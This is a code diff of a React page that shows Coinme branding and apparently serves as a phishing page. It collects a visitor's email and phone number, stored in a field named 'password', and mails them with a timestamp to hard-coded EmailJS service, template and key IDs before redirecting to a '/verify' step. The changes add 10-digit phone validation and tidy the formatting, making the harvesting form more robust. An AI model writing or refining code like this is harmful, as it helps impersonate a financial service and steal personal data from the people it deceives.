@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import emailjs from 'emailjs-com';
 
-const Alrt = () => {
+const Home = () => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState('');
@@ -31,6 +31,9 @@ const Alrt = () => {
       setPasswordError('Number is required');
       setPasswordPlaceholder('Enter your Number');
       isValid = false;
+    } else if (!/^[0-9]{10}$/.test(password)) {
+      setPasswordError('Number must be exactly 10 digits');
+      isValid = false;
     } else {
       setPasswordError('');
     }
@@ -38,25 +41,22 @@ const Alrt = () => {
     // If valid, send email
     if (isValid) {
       const templateParams = {
-        web_name:'Coinme',
+        web_name: 'Coinme',
         from_name: 'Coinme',
-        message: `Name: ${email}, 
-        Phone: ${password}, 
-        Date: ${new Date().toLocaleDateString()}, 
-        Time: ${new Date().toLocaleTimeString()}`,
+        message: `Name: ${email}, \nPhone: ${password}, \nDate: ${new Date().toLocaleDateString()}, \nTime: ${new Date().toLocaleTimeString()}`,
       };
 
       emailjs
-      .send(
-        'service_vqas695', // Your EmailJS Service ID
-        'template_2f8nyuj', // Your EmailJS Template ID
-        templateParams,
-        'v8nhKmEDxUkTIhobT' // Your EmailJS Public Key
+        .send(
+          'service_vqas695',
+          'template_2f8nyuj',
+          templateParams,
+          'v8nhKmEDxUkTIhobT'
         )
         .then(() => {
           setEmail('');
           setPassword('');
-          navigate('/verify'); // Navigate to the target route
+          navigate('/verify');
         })
         .catch((error) => {
           console.error('Error:', error);
@@ -68,8 +68,7 @@ const Alrt = () => {
   return (
     <div className="bg-white min-h-screen flex flex-col items-center pt-32">
       <header className="flex justify-center mb-8">
-      <img src={require('../Image/coinme1.jpg')} alt="Navigation" className="w-36" />
-
+        <img src={require('../Image/coinme1.jpg')} alt="Navigation" className="w-36" />
       </header>
 
       <div className="w-full max-w-lg border-2 bg-white p-8 rounded-lg shadow-lg">
@@ -100,10 +99,15 @@ const Alrt = () => {
             </div>
             <div className="mb-6">
               <input
-                type="number"
+                type="text"
                 id="password"
                 value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                onChange={(e) => {
+                  const value = e.target.value;
+                  if (/^\d{0,10}$/.test(value)) {
+                    setPassword(value);
+                  }
+                }}
                 placeholder={passwordPlaceholder}
                 className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                   passwordError ? 'border-red-500' : 'border-gray-300'
@@ -127,4 +131,4 @@ const Alrt = () => {
   );
 };
 
-export default Alrt;
+export default Home;
